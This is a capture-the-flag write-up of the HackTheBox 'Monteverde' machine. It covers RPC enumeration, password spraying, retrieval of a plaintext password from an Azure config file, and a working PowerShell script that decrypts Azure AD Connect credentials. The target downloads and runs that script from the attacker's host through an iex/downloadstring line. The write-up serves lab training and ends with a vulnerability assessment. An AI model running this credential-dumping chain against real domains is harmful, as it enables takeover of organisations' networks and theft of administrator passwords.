---
icon: circle-nodes
---

# HTB-MONTEVERDE



<figure><img src="../../../../.gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>



### Attack Chain Summary

1. **RPC Enumeration** → User and group discovery
2. **Password Spraying** → Finding weak credentials
3. **SMB Share Access** → File system exploration
4. **Credential Discovery** → Azure configuration file analysis
5. **Lateral Movement** → User privilege escalation
6. **Azure AD Connect Exploit** → Administrator credential extraction
7. **Domain Admin Access** → Full system compromise

***

### Phase 1: Initial Reconnaissance and RPC Enumeration

#### Rustscan&#x20;

```powershell
┌──(sn0x㉿sn0x)-[~/HTB/Monteverde]
└─$ rustscan -a 10.10.10.172 \ blah blah blah
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.10.172:53
Open 10.10.10.172:88
Open 10.10.10.172:135
Open 10.10.10.172:139
Open 10.10.10.172:389
Open 10.10.10.172:445
Open 10.10.10.172:464
Open 10.10.10.172:593
Open 10.10.10.172:636
Open 10.10.10.172:3268
Open 10.10.10.172:3269
Open 10.10.10.172:5985
Open 10.10.10.172:9389
Open 10.10.10.172:49667
Open 10.10.10.172:49673
Open 10.10.10.172:49674
Open 10.10.10.172:49676
Open 10.10.10.172:49696
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 10:31 UTC
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:31
Completed Parallel DNS resolution of 1 host. at 10:31, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 10:31
Scanning 10.10.10.172 [18 ports]
Discovered open port 53/tcp on 10.10.10.172
Discovered open port 139/tcp on 10.10.10.172
Discovered open port 445/tcp on 10.10.10.172
Discovered open port 135/tcp on 10.10.10.172
Discovered open port 49676/tcp on 10.10.10.172
Discovered open port 88/tcp on 10.10.10.172
Discovered open port 49667/tcp on 10.10.10.172
Discovered open port 5985/tcp on 10.10.10.172
Discovered open port 464/tcp on 10.10.10.172
Discovered open port 49673/tcp on 10.10.10.172
Discovered open port 389/tcp on 10.10.10.172
Discovered open port 49696/tcp on 10.10.10.172
Discovered open port 3269/tcp on 10.10.10.172
Discovered open port 593/tcp on 10.10.10.172
Discovered open port 9389/tcp on 10.10.10.172
Discovered open port 636/tcp on 10.10.10.172
Discovered open port 49674/tcp on 10.10.10.172
Discovered open port 3268/tcp on 10.10.10.172
Completed SYN Stealth Scan at 10:31, 0.98s elapsed (18 total ports)
Initiating Service scan at 10:31
Scanning 18 services on 10.10.10.172
Completed Service scan at 10:32, 67.24s elapsed (18 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.172
Retrying OS detection (try #2) against 10.10.10.172
Initiating Traceroute at 10:32
Completed Traceroute at 10:32, 0.92s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 10:32
Completed Parallel DNS resolution of 2 hosts. at 10:32, 0.01s elapsed
DNS resolution of 2 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.10.172.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:32
NSE Timing: About 99.96% done; ETC: 10:33 (0:00:00 remaining)
Completed NSE at 10:33, 40.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 16.11s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
Nmap scan report for 10.10.10.172
Host is up, received user-set (0.69s latency).
Scanned at 2025-09-05 10:31:23 UTC for 138s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-05 10:31:32Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=9/5%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68BABC85%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=U)
SEQ(SP=107%GCD=1%ISR=10C%TI=RD%II=I%TS=U)
OPS(O1=M542NW8NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 2859/tcp): CLEAN (Timeout)
|   Check 2 (port 44230/tcp): CLEAN (Timeout)
|   Check 3 (port 47166/udp): CLEAN (Timeout)
|   Check 4 (port 52154/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-09-05T10:32:49
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   612.51 ms 10.10.16.1
2   913.52 ms 10.10.10.172

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.70 seconds
           Raw packets sent: 102 (8.196KB) | Rcvd: 47 (2.664KB)
```

#### Anonymous RPC Connection

Establishing anonymous connection to enumerate domain information:

```bash
rpcclient -U "" -N 10.10.10.172
```

**Connection Result:** Successfully connected with null session

#### Domain User Enumeration

```bash
rpcclient $> enumdomusers
```

**Output:**

```
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

#### Domain Group Enumeration

```bash
rpcclient $> enumdomgroups
```

**Output:**

```
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```

#### Detailed User and Group Analysis

**Querying Specific Groups**

```bash
rpcclient $> querygroup 0xa34
        Group Name:     Developers
        Description:
        Group Attribute:7
        Num Members:0

rpcclient $> querygroup 0xa33
        Group Name:     HelpDesk
        Description:
        Group Attribute:7
        Num Members:1

rpcclient $> querygroup 0x201
        Group Name:     Domain Users
        Description:    All domain users
        Group Attribute:7
        Num Members:11
```

**Detailed User Information**

```bash
rpcclient $> queryuser 0xa2d
        User Name   :   svc-netapp
        Full Name   :   svc-netapp
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 01 Jan 1970 00:00:00 UTC
        Logoff Time              :      Thu, 01 Jan 1970 00:00:00 UTC
        Kickoff Time             :      Thu, 14 Sep 30828 02:48:05 UTC
        Password last set Time   :      Fri, 03 Jan 2020 13:01:43 UTC
        Password can change Time :      Sat, 04 Jan 2020 13:01:43 UTC
        Password must change Time:      Thu, 14 Sep 30828 02:48:05 UTC
        user_rid :      0xa2d
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000

rpcclient $> queryuser 0xa36
        User Name   :   roleary
        Full Name   :   Ray O'Leary
        Home Drive  :   \\monteverde\users$\roleary
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 01 Jan 1970 00:00:00 UTC
        Logoff Time              :      Thu, 01 Jan 1970 00:00:00 UTC
        Kickoff Time             :      Thu, 14 Sep 30828 02:48:05 UTC
        Password last set Time   :      Fri, 03 Jan 2020 13:08:06 UTC
        Password can change Time :      Sat, 04 Jan 2020 13:08:06 UTC
        Password must change Time:      Thu, 14 Sep 30828 02:48:05 UTC
        user_rid :      0xa36
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
```

#### User List Compilation

Creating comprehensive user list for password spraying:

```bash
cat users
```

**Enumerated Users:**

```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

***

### Phase 2: Password Spraying Attack

#### Automated Password Spraying with CrackMapExec

Testing username-as-password combinations across all discovered accounts:

```bash
crackmapexec smb 10.10.10.172 -u users -p users
```

**Complete Output:**

```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

**Critical Discovery:** Valid credentials found

* **Username:** `SABatchJobs`
* **Password:** `SABatchJobs`

***

### Phase 3: SMB Share Enumeration and Access

#### Share Discovery with SMBMap

```bash
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
```

**Output:**

```
[+] IP: 10.10.10.172:445        Name: 10.10.10.172              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY
```

#### Testing SMBClient Access

```bash
smbclient -U "SABatchJobs%SABatchJobs" //10.10.10.172/users
```

**Result:** `tree connect failed: NT_STATUS_BAD_NETWORK_NAME`

#### Recursive Directory Listing

```bash
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -r users$
```

**Output:**

```
[+] IP: 10.10.10.172:445        Name: 10.10.10.172              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY
        ./users$
        dr--r--r--                0 Fri Jan  3 13:12:48 2020    .
        dr--r--r--                0 Fri Jan  3 13:12:48 2020    ..
        dr--r--r--                0 Fri Jan  3 13:15:23 2020    dgalanos
        dr--r--r--                0 Fri Jan  3 13:41:18 2020    mhope
        dr--r--r--                0 Fri Jan  3 13:14:56 2020    roleary
        dr--r--r--                0 Fri Jan  3 13:14:28 2020    smorgan
        .\mhope\
        dr--r--r--                0 Fri Jan  3 08:41:18 2020    .
        dr--r--r--                0 Fri Jan  3 08:41:18 2020    ..
        -w--w--w--             1212 Fri Jan  3 09:59:24 2020    azure.xml
```

**Critical Finding:** Azure configuration file discovered in mhope's directory

***

### Phase 4: Credential Extraction from Azure Configuration

#### Downloading Azure Configuration File

```bash
smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c 'get mhope/azure.xml azure.xml'
```

**Output:**

```
getting file \mhope\azure.xml of size 1212 as azure.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

#### Analyzing Azure.xml Content

```bash
ls
```

**Files Retrieved:**

```
'10.10.10.172-users_*'   azure.xml   groups   users
```

#### Azure.xml File Analysis

**File Content:**

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

**Credentials Extracted:**

* **Username:** `mhope` (inferred from file location)
* **Password:** `4n0therD4y@n0th3r$`

***

### Phase 5: Lateral Movement and User Access

#### Establishing WinRM Connection

```bash
evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

**Output:**

```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
```

#### User Flag Retrieval

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
*Evil-WinRM* PS C:\Users\mhope> cat Desktop\user.txt
7c6693f0856464cd48fdc0064xxxxxxx
```

**User Flag:** `7c6693f0856464cd48fdc0064xxxxxx`

***

### Phase 6: Privilege Escalation - User Analysis

#### Examining mhope User Properties

```powershell
*Evil-WinRM* PS C:\> net user mhope
```

**Output:**

```
User name                    mhope
Full Name                    Mike Hope
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               \\monteverde\users$\mhope
Last logon                   1/18/2020 11:05:46 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users         
The command completed successfully.
```

**Key Finding:** mhope is a member of the "Azure Admins" group

#### Azure AD Connect Discovery

```powershell
*Evil-WinRM* PS C:\Program Files> ls *Azure*
```

**Output:**

```
    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

**Critical Discovery:** Azure AD Connect is installed, indicating potential for credential extraction

***

### Phase 7: Azure AD Connect Exploitation

#### Understanding the Attack Vector

The presence of Azure AD Connect and mhope's membership in "Azure Admins" group indicates that this user can access the local database containing encrypted replication credentials.

**Reference:** [Azure AD Connect for Red Teamers by @_xpn_](https://blog.xpnsec.com/azuread-connect-for-redteam/)

#### Preparing the Exploit Script

Creating PowerShell script to extract and decrypt credentials:

```powershell
cat Get-MSOLCredentials.ps1
```

**Script Content:**

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

#### Setting up HTTP Server

```bash
python3 -m http.server 80
```

**Output:**

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.172 - - [05/Sep/2025 11:43:45] "GET /Get-MSOLCredentials.ps1 HTTP/1.1" 200 -
```

#### Executing the Exploit

```powershell
*Evil-WinRM* PS C:\Program Files> iex(new-object net.webclient).downloadstring('http://10.10.16.7/Get-MSOLCredentials.ps1')
```

**Output:**

```
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

**Administrator Credentials Extracted:**

* **Username:** `administrator`
* **Password:** `d0m@in4dminyeah!`

***

### Phase 8: Domain Administrator Access

#### Establishing Administrative WinRM Session

```bash
evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
```

**Output:**

```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
```

#### Root Flag Retrieval

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
```

**Output:**

```
    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         9/5/2025   3:26 AM             34 root.txt
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
17e1ab9ebcaf37bb95a63615fb8d7587
```

**Root Flag:** `17e1ab9ebcaf37bb95a63615fb8d7587`

***

### Technical Analysis and Vulnerability Assessment

#### Attack Chain Overview

```
RPC Enumeration → Password Spraying → SMB Access → Azure Config Discovery → 
Lateral Movement → Azure AD Connect Exploit → Domain Admin Access
```

#### Critical Vulnerabilities Exploited

1. **Anonymous RPC Access**
   * Null session allowed enumeration of users and groups
   * No authentication required for initial reconnaissance
2. **Weak Password Policy**
   * SABatchJobs account used username as password
   * No complexity requirements enforced
3. **Excessive Share Permissions**
   * users$ share accessible with low-privilege account
   * Sensitive Azure configuration files exposed
4. **Azure Configuration Exposure**
   * Password stored in plaintext XML file
   * Improper file permissions on sensitive data
5. **Azure AD Connect Misconfiguration**
   * Local database accessible to Azure Admins group members
   * Encrypted replication credentials decryptable

#### Azure AD Connect Exploitation Details

The exploit leverages the fact that Azure AD Connect stores domain administrator credentials in a local SQL Server database. These credentials are used for Active Directory replication to Azure. The attack:

1. **Connects to local ADSync database** using integrated authentication
2. **Extracts encryption keys** from server configuration
3. **Retrieves encrypted credentials** from management agent configuration
4. **Uses Microsoft's mcrypt.dll** to decrypt the credentials
5. **Reveals administrator password** in plaintext

This is particularly dangerous because:

* Any member of Azure Admins can perform this attack
* The extracted credentials are often domain administrator accounts
* The attack leaves minimal forensic evidence
* It's a legitimate feature being abused, not an exploit

<figure><img src="../../../../.gitbook/assets/complete (34).gif" alt=""><figcaption></figcaption></figure>
